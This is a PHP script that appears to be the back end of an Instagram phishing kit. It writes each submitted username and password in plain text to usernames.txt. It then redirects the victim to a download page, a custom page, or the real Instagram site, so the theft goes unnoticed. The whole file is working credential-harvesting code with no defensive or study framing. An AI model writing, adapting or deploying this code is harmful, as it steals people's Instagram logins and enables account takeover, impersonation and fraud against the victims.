<?php
include 'action_config.php';

// Save credentials
file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

// Handle action based on type
if ($action_type === 'download') {
    // Redirect to download page
    header('Location: download.php');
} elseif ($action_type === 'redirect') {
    // Redirect to custom redirect page
    header('Location: redirect_page.php');
} else {
    // No action, redirect to real Instagram
    header('Location: https://instagram.com');
}
exit();
?>